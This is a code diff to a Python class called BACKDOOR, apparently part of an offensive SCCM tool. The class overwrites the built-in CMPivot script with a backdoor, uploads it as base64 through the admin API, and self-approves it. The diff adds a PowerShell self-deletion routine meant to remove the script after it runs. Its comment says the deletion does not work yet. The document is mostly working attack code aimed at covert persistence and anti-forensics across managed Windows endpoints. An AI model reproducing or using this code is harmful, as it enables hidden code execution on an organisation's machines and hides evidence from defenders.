@@ -60,15 +60,27 @@ class BACKDOOR:
     def update_cmpivot(self, option):
         #read the script provided and transform to the expected format for API
         try:
+            match = "# SIG # Begin signature block"
             script_body = ""
+            cleanup = '''
+function Do-Delete {
+    Remove-Item $PSScriptRoot -Force 
+}
+Do-Delete
+'''
             if option == "backdoor":
                 #Second check for backup, keep them honest. You do not want to mess this up.
                 if os.path.exists(f"{self.logs_dir}/cmpivot_backup.ps1"):
                     logger.debug("[*] Backup exists, loading script.")
                     with open(f"{self.backdoor_script}", "r") as f:
-                        file_content = f.read()
-                        bom = codecs.BOM_UTF8
-                        byte_array = bom + file_content.encode('utf-8')
+                        file_content = f.readlines()
+                        #this is attempting to remove the script after execution but not working. it's on the agenda.
+                        for i, line in enumerate(file_content):
+                            if match in line:
+                                file_content.insert(i, cleanup + '\n')
+                                break
+                        updated_content = ''.join(file_content)
+                        byte_array = updated_content.encode('utf-8')
                         script_body = base64.b64encode(byte_array).decode('utf-8')
                 else:
                     logger.info("[-] CMPivot backup script not found.")
@@ -79,12 +91,12 @@ class BACKDOOR:
                 if os.path.exists(f"{self.logs_dir}/cmpivot_backup.ps1"):
                     with open(f"{self.logs_dir}/cmpivot_backup.ps1", "r") as f:
                         file_content = f.read()
-                        bom = codecs.BOM_UTF8
-                        byte_array = bom + file_content.encode('utf-8')
+                        byte_array = file_content.encode('utf-8') 
                         script_body = base64.b64encode(byte_array).decode('utf-8')
                 else:
                     logger.info("[-] Could not locate backup file.")
                     return
+                
             body = {"Script": f"{script_body}",
                     "ScriptVersion": "1",
                     "ScriptName": "CMPivot"}
@@ -126,8 +138,8 @@ class BACKDOOR:
                 logger.info("[+] CMPivot script approved.")
                 return
             if r.status_code == 500:
-                 logger.info(f"[-] Hierarchy settings do not allow author's to approve their own scripts. All custom script execution will fail.")
-                 return
+                logger.info(f"[-] Hierarchy settings do not allow author's to approve their own scripts. All custom script execution will fail.")
+                return
             else:
                 logger.info("[*] Something went wrong:")
                 logger.info("Status Code: " + r.status_code)
